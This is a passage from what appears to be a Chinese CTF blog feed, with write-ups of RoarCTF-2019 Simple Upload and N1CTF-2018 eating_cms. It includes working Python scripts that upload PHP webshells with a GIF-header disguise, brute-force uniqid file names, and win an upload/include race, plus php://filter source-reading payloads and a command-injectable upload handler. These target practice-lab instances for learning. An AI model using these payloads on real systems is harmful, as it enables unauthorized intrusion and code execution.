class="string">&quot;%08x%05x&quot;</span>,$time[sec],$time[usec]);</span><br></pre></td></tr></table></figure><p>默认生成的13位id，分为<code>前八位</code>+<code>后五位</code>。</p><p>后五位为毫秒数的16进制，这样我们可以通过两次的文件名爆破中间的文件名，不用爆破五位数(过于离谱)。但还是太大，动辄20万的访问量……</p><h4><span id="优化python版的uniqid">优化–python版的uniqid：</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time, math, random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># port of uniqmodule.c to pure python by Derwentx,</span></span><br><span class="line"><span class="comment"># inspired by http://gurukhalsa.me/2011/uniqid-in-python/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uniqid</span>(<span class="params">prefix=<span class="string">&#x27;&#x27;</span>, more_entropy=<span class="literal">False</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;uniqid([prefix=&#x27;&#x27;[, more_entropy=False]]) -&gt; str</span></span><br><span class="line"><span class="string">    Gets a prefixed unique identifier based on the current</span></span><br><span class="line"><span class="string">    time in microseconds.</span></span><br><span class="line"><span class="string">    prefix</span></span><br><span class="line"><span class="string">        Can be useful, for instance, if you generate identifiers</span></span><br><span class="line"><span class="string">        simultaneously on several hosts that might happen to generate</span></span><br><span class="line"><span class="string">        the identifier at the same microsecond.</span></span><br><span class="line"><span class="string">        With an empty prefix, the returned string will be 13 characters</span></span><br><span class="line"><span class="string">        long. If more_entropy is True, it will be 23 characters.</span></span><br><span class="line"><span class="string">    more_entropy</span></span><br><span class="line"><span class="string">        If set to True, uniqid() will add additional entropy (using</span></span><br><span class="line"><span class="string">        the combined linear congruential generator) at the end of</span></span><br><span class="line"><span class="string">        the return value, which increases the likelihood that</span></span><br><span class="line"><span class="string">        the result will be unique.</span></span><br><span class="line"><span class="string">    Returns the unique identifier, as a string.&quot;&quot;&quot;</span></span><br><span class="line">    m = time.time()</span><br><span class="line">    sec = math.floor(m)</span><br><span class="line">    usec = math.floor(<span class="number">1000000</span> * (m - sec))</span><br><span class="line">    <span class="keyword">if</span> more_entropy:</span><br><span class="line">        lcg = random.random()</span><br><span class="line">        the_uniqid = <span class="string">&quot;%08x%05x%.8F&quot;</span> % (sec, usec, lcg * <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        the_uniqid = <span class="string">&#x27;%8x%05x&#x27;</span> % (sec, usec)</span><br><span class="line"></span><br><span class="line">    the_uniqid = prefix + the_uniqid</span><br><span class="line">    <span class="keyword">return</span> the_uniqid</span><br></pre></td></tr></table></figure><p>利用这个来缩小差距：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 多重文件上传与文件上传函数</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Func <span class="keyword">import</span> uniqid</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://0b3a62d9-f8a1-4b30-9fb0-7ebe4a879ffa.node4.buuoj.cn:81/?a=upload&quot;</span></span><br><span class="line">shell = <span class="string">&quot;&lt;?php @eval($_POST[&#x27;ok&#x27;]) ?&gt;&quot;</span></span><br><span class="line">prefix = <span class="string">&quot;GIF8!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#   GIF8!</span></span><br><span class="line"><span class="comment">#   \xff\xd8</span></span><br><span class="line"><span class="comment">#   #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>(<span class="params">file_url, file_prefix, file_shell, file_value, file_name, file_type</span>):</span></span><br><span class="line">    con = file_prefix + <span class="string">&quot;\n&quot;</span> + file_shell</span><br><span class="line">    files = &#123;</span><br><span class="line">        file_value: (file_name, con, file_type),</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=file_url, files=files)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print (uniqid())</span></span><br><span class="line"><span class="comment"># print (upload_file(url, prefix, &quot;1234&quot;, &quot;file&quot;, &quot;1.txt&quot;, &quot;image/jpeg&quot;))</span></span><br><span class="line"><span class="comment"># print (uniqid())</span></span><br><span class="line"><span class="built_in">print</span> (upload_file(url, prefix, shell, <span class="string">&quot;file1&quot;</span>, <span class="string">&quot;1.php&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> (uniqid())</span><br><span class="line"><span class="comment"># print (upload_file(url, prefix, &quot;1234&quot;, &quot;file&quot;, &quot;1.txt&quot;, &quot;image/jpeg&quot;))</span></span><br><span class="line"><span class="comment"># print (uniqid())</span></span><br></pre></td></tr></table></figure><p>在多次尝试后（花了我老长时间……</p><p>这样差距可以拉到4位左右</p><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment">#   Come from File_Upload_Multi</span></span><br><span class="line"><span class="comment">#   基于两个 uniqid 破解中间文件名</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://0b3a62d9-f8a1-4b30-9fb0-7ebe4a879ffa.node4.buuoj.cn:81/Public/Uploads/2021-09-15/&quot;</span></span><br><span class="line"></span><br><span class="line">first_one = <span class="string">&quot;6141708c79d38&quot;</span></span><br><span class="line">after_one = <span class="string">&quot;6141708c7ffff&quot;</span></span><br><span class="line">sec = first_one[<span class="number">0</span>:<span class="number">8</span>]</span><br><span class="line">usec_1 = <span class="string">&quot;0x&quot;</span>+first_one[<span class="number">8</span>:]</span><br><span class="line">usec_2 = <span class="string">&quot;0x&quot;</span>+after_one[<span class="number">8</span>:]</span><br><span class="line">f = (<span class="built_in">int</span>(usec_1, <span class="number">16</span>))</span><br><span class="line">e = (<span class="built_in">int</span>(usec_2, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(f, e):</span><br><span class="line">    that_one = sec + <span class="built_in">hex</span>(n)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print (that_one)</span></span><br><span class="line">    target = url + that_one + <span class="string">&quot;.php&quot;</span></span><br><span class="line">    res = requests.get(url=target)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[200]==&gt; &quot;</span>+target)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[&quot;</span>+<span class="built_in">str</span>(res.status_code)+<span class="string">&quot;] ==&gt; &quot;</span>+target+<span class="string">&quot; ==&gt; &quot;</span>+<span class="built_in">str</span>(e-f)+<span class="string">&quot;/&quot;</span>+<span class="built_in">str</span>(n-f+<span class="number">1</span>))</span><br><span class="line">    sleep(<span class="number">0.015</span>)</span><br></pre></td></tr></table></figure><p>后四位设为<code>ffff</code></p><p><img src="/images/RoarCTF-2019-Simple-Upload/image-20210915142749628.png" alt="image-20210915142749628"></p><p>终于……爆出来了……这玩意搞我几天了……🙄</p><p>直接出……</p><p><img src="/images/RoarCTF-2019-Simple-Upload/image-20210915143040265.png" alt="image-20210915143040265"></p><h4><span id="还有更简单的">还有更简单的</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.&lt;&gt;php&#x27;</span>, con, <span class="string">&#x27;image/jpeg&#x27;</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于搜索的是<code>.php</code>，所以……</p><p><img src="D:\HexoBlog\source\images\RoarCTF-2019-Simple-Upload\image-20210916090229278.png" alt="image-20210916090229278"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;Tinkphp、文件上传、爆破&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF-2018-eating_cms</title>
    <link href="http://example.com/2021/09/09/N1CTF-2018-eating_cms/"/>
    <id>http://example.com/2021/09/09/N1CTF-2018-eating_cms/</id>
    <published>2021-09-09T15:00:25.299Z</published>
    <updated>2021-09-09T15:42:41.902Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>竞争文件包含、命令注入、parse_url漏洞</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E7%AB%9E%E4%BA%89%E5%8C%85%E5%90%AB">竞争包含</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">命令注入</a></li></ul><!-- tocstop --></div><br>题目是一个登录窗口<p>文件扫描：</p><img src="/images/N1CTF-2018-eating_cms/image-20210909230318787.png" alt="image-20210909230318787" style="zoom:80%;"><p><code>.viminfo</code> :</p><p><img src="/images/N1CTF-2018-eating_cms/image-20210909230554367.png" alt="image-20210909230554367"></p><p>注册账户登入，发现可疑的page参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b1c5a1ac-726f-4d16-ac0e-e1390a3c6c18.node4.buuoj.cn:81&#x2F;user.php?page&#x3D;guest</span><br></pre></td></tr></table></figure><p>伪协议可以读取各个文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</span><br></pre></td></tr></table></figure><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( $_SESSION[<span class="string">&#x27;user&#x27;</span>] ))&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    $oper_you_can_do = $OPERATE_admin;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $oper_you_can_do = $OPERATE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>]) || $_GET[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        $page = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])|| $_GET[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        $page = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($page === <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line">            Header(<span class="string">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">filter_directory();</span><br><span class="line"><span class="comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="comment">//    $page = &#x27;info&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>应该是做了权限控制……？</p><p><code>updateadmin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/update.html&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>temlates</code>渲染模板。实际上，确实遇到过有的后台的模板造成文件上传的问题</p><p>扫templates：</p><img src="/images/N1CTF-2018-eating_cms/image-20210909231438035.png" alt="image-20210909231438035" style="zoom:80%;"><p>好家伙……</p><p>确实有上传点，点击会跳转：<code>upllloadddd.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$allowtype = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line">$size = <span class="number">10000000</span>;</span><br><span class="line">$path = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line">$filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $filename;</span><br><span class="line">$picdata = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.$picdata.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ext = array_pop(explode(<span class="string">&quot;.&quot;</span>,$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先看到的就是<strong>竞争包含</strong></p><h4><span id="竞争包含">竞争包含</span></h4><p>这里的处理先将临时文件移动到本地目录中，再检测文件后缀，删除非法文件，感觉很典型，所以直接就做了……。</p><p>在文件删除之前去包含文件并利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url_upload = <span class="string">&quot;http://b1c5a1ac-726f-4d16-ac0e-e1390a3c6c18.node4.buuoj.cn:81/upllloadddd.php&quot;</span></span><br><span class="line">url_include = <span class="string">&quot;http://b1c5a1ac-726f-4d16-ac0e-e1390a3c6c18.node4.buuoj.cn/upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = url_upload</span><br><span class="line">        shell = <span class="string">&quot;&lt;?php system(&#x27;cat /flag_233333&#x27;);echo &#x27;okokokok&#x27;;echo __FILE__;?&gt;&quot;</span></span><br><span class="line">        prefix = <span class="string">&quot;GIF8!&quot;</span>  <span class="comment"># GIF8! &lt;-|or|-&gt; \xff\xd8 &lt;-|or|-&gt; #define  counter_width 40 \n#define  counter_height 10</span></span><br><span class="line">        con = prefix + <span class="string">&quot;\n&quot;</span> + shell</span><br><span class="line">        url = <span class="string">&quot;http://b1c5a1ac-726f-4d16-ac0e-e1390a3c6c18.node4.buuoj.cn:81/upllloadddd.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>&#125;</span><br><span class="line">        files = &#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.php&#x27;</span>, shell, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, headers=headers, files=files)</span><br><span class="line">        res = response.text</span><br><span class="line">        print(res)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">include</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        filename = <span class="string">&quot;1.php&quot;</span></span><br><span class="line">        url = url_include+filename</span><br><span class="line">        res = requests.post(url=url)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&quot;[not fount or so fast!!!] ----&gt;&quot;</span>+<span class="built_in">str</span>(res))</span><br><span class="line">            print(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;okokok&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                print(<span class="string">&quot;[success!!!]&quot;</span>)</span><br><span class="line">                print(res.text)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;[some error]&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=upload)</span><br><span class="line">t1.daemon = <span class="literal">True</span></span><br><span class="line">t1.start()</span><br><span class="line">include()</span><br></pre></td></tr></table></figure><p>其实一开始还是像拿shell的，但似乎没写文件权限……upload下的文件是定期删除的……</p><p>后来发现tmp下可以写文件，又包含不进去，可能有目录限制……？也没试弹shell，直接读了……</p><img src="/images/N1CTF-2018-eating_cms/image-20210909232612087.png" alt="image-20210909232612087" style="zoom:80%;"><h4><span id="命令注入">命令注入</span></h4><p>后来看别人的wp，我好像漏了点什么🤣</p><p><code>function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Header(<span class="string">&quot;Location: 